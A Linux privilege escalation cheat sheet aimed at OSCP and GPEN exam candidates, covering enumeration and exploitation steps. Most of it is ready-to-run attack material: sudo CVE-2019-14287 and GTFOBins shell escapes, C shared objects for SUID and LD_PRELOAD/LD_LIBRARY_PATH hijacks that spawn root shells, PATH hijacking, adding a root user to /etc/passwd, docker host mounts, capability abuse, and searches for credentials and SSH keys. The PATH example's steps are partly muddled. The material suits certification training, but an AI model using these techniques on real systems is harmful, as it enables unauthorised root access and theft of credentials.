# Linux Privilege Escalation Cheat Sheet (OSCP / GPEN)

This cheat sheet focuses on **systematic enumeration and exploitation paths** for Linux privilege escalation commonly encountered in **OSCP and GPEN exams**.

Core methodology:

```
Enumerate → Identify Weakness → Exploit → Maintain Access
```

Privilege escalation is **mostly enumeration**. Carefully inspect the system before attempting exploitation.

---

# 1. Basic System Enumeration

First commands to run:

```
hostname
uname -a
cat /proc/version
cat /etc/issue
ps -A
ps axjf
env
sudo -l
id
history
ifconfig
netstat -ano
```

## Current User

```bash
whoami
id
groups
```

Important groups to watch:

```
sudo
docker
lxd
adm
disk
```

---

## System Information

```bash
uname -a
cat /etc/os-release
hostname
cat /proc/version
cat /etc/issue
```

Kernel version:

```bash
uname -r
```

Search for kernel exploits:

```bash
searchsploit linux kernel <version>
```

---

# 2. Sudo Privileges

If the sudo version is below 1.8.28 (Sudo-CVE-2019-14287)

```
sudo -u#-1 /bin/bash
```

Check allowed commands:

```bash
sudo -l
```

Example output:

```
(ALL) NOPASSWD: /usr/bin/find
```

Check **GTFOBins**:

https://gtfobins.github.io/

Example exploit:

```bash
sudo find . -exec /bin/sh \; -quit
```

---

# 3. SUID Binaries

Search for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

Common exploitable binaries:

```
find
vim
less
awk
perl
python
bash
nmap
```

Example:

```bash
find . -exec /bin/sh \; -quit
```

vim suid privilege escalation

```
/usr/bin/vim -c ':set shell=/bin/bash\ -p' -c ':shell'
```

## SUID / SGID Executables - Shared Object Injection
Run strace on the file and search the output for open/access calls and for "no such file" errors:

```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

Example so file
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}

```

```
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

then run the SUID binary

---

# 4. Writable Files

Find writable files:

```bash
find / -writable -type f 2>/dev/null
```

Writable directories:

```bash
find / -writable -type d 2>/dev/null
```

Important locations:

```
/tmp
/dev/shm
/var/tmp
/opt
/var/www
```

---

# 5. Sensitive Files

Check permissions:

```bash
ls -l /etc/passwd
ls -l /etc/shadow
```

If `/etc/passwd` is writable:

Generate password hash:

```bash
openssl passwd password
```

Add root user:

```
hacker:$1$hash:0:0:root:/root:/bin/bash
```

Switch user:

```bash
su hacker
```

---

# 6. Cron Jobs

Check cron tasks:

```bash
crontab -l
cat /etc/crontab
ls -la /etc/cron*
```

Look for scripts executed as root.

Check if writable:

```bash
ls -la /path/script.sh
```

---

# 7. PATH Variable Exploitation

Be sure you can answer the questions below before trying this:
```
What folders are located under $PATH
Does your current user have write privileges for any of these folders?
Can you modify $PATH?
Is there a script/application you can start that will be affected by this vulnerability?
```
Check PATH:

```bash
echo $PATH
```

If script calls commands without absolute path:

Example vulnerable script:

```
backup.sh → tar
```

Create malicious binary:

```bash
echo "/bin/bash" > tar
chmod +x tar
```

```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Then

```
chmod +x /home/user/overwrite.sh
/tmp/rootbash -p
```

Modify PATH:

```bash
export PATH=/tmp:$PATH
```
Find writable folders
```
find / -writable 2>/dev/null
```

Go there (for example, /tmp) and create this:

```
#include <unistd.h>

int main() {
	setuid(0);
	system("/bin/bash -p");
}
```

Compile this into an executable and set the SUID bit.

```
gcc path_exp.c -o path -w
chmod u+s path
ls -la
```

Once executed, “path” will look for an executable named “thm” inside folders listed under PATH.

```
cd /tmp
export PATH=/tmp:$PATH
echo "/bin/bash" > thm
chmod 777 thm
./path
```

---

# 8. Running Processes

Check running processes:

```bash
ps aux
```

Look for:

```
custom scripts
root services
cron jobs
```

---

# 9. System Services

List services:

```bash
systemctl list-units --type=service
```

Check service configuration files.

Look for writable service scripts.

---

# 10. Linux Capabilities

Check capabilities:

```bash
getcap -r / 2>/dev/null
```

Example:

```
/usr/bin/python = cap_setuid+ep
```

Exploit:

```bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
/home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

# 11. Writable Service Files

Check systemd services:

```bash
ls -la /etc/systemd/system/
```

If writable, modify service command.

Restart service to gain root shell.

---

# 12. Docker Privilege Escalation

Check group membership:

```bash
groups
```

If user belongs to `docker` group:

```bash
docker run -it -v /:/mnt alpine chroot /mnt /bin/sh
```

---

# 13. LXD Privilege Escalation

Check group:

```bash
groups
```

If user belongs to `lxd` group, containers can mount host filesystem.

---

# 14. NFS Misconfiguration

Check exports:

```bash
showmount -e TARGET
```

If writable share exists:

Mount share and upload SUID binary.

---

# 15. Environment Variables

Check environment:

```bash
env
```

Look for credentials or sensitive information.

---

# 16. Credential Search

Search for passwords in configuration files:

```bash
grep -R "password" /etc 2>/dev/null
grep -R "password" /var/www 2>/dev/null
```

---

# 17. SSH Keys

Check SSH directories:

```bash
ls -la ~/.ssh
```

Look for:

```
id_rsa
authorized_keys
```

---

# 18. Kernel Exploits

Check kernel version:

```bash
uname -r
```

Search exploit database:

```bash
searchsploit linux kernel <version>
```

Examples:

```
Dirty COW
OverlayFS
PwnKit
```

---

# SUDO - Environment Variables - LD_PRELOAD and LD_LIBRARY_PATH

run "sudo -l" 

LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

Create a shared object using the sample library code below.

```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

Sample library code:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:

```
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

Run ldd against the apache2 program file to see which shared libraries are used by the program:

```
ldd /usr/sbin/apache2
```

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the following code:

```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):

```
sudo LD_LIBRARY_PATH=/tmp apache2
```

---

# 19. Automated Enumeration Tools

Common tools:

```
linpeas https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
linux-smart-enumeration https://github.com/diego-treitos/linux-smart-enumeration
LinEnum https://github.com/rebootuser/LinEnum
LES (Linux Exploit Suggester) https://github.com/mzet-/linux-exploit-suggester
Linux PrivChecker https://github.com/linted/linuxprivchecker
https://github.com/dominicbreuker/pspy
```

Run example:

```bash
./linpeas.sh
```

---

# 20. Quick Enumeration Commands

Run these immediately after gaining shell:

```bash
whoami
id
uname -a
sudo -l
cat /etc/crontab
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
ls -la /home
```

---

# 21. Important Locations to Inspect

```
/home
/tmp
/var/tmp
/dev/shm
/opt
/var/www
```

---

# 22. Enumeration Questions

Always ask:

```
What runs as root?
What can I modify?
What executes automatically?
```

---

# 23. OSCP Privilege Escalation Workflow

```
1. Check sudo privileges
2. Check SUID binaries
3. Check cron jobs
4. Check writable files
5. Check capabilities
6. Check kernel exploits
7. Check services
8. Check credentials
```

---

# 24. Additional Resources


```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html
https://payatu.com/blog/a-guide-to-linux-privilege-escalation/
```
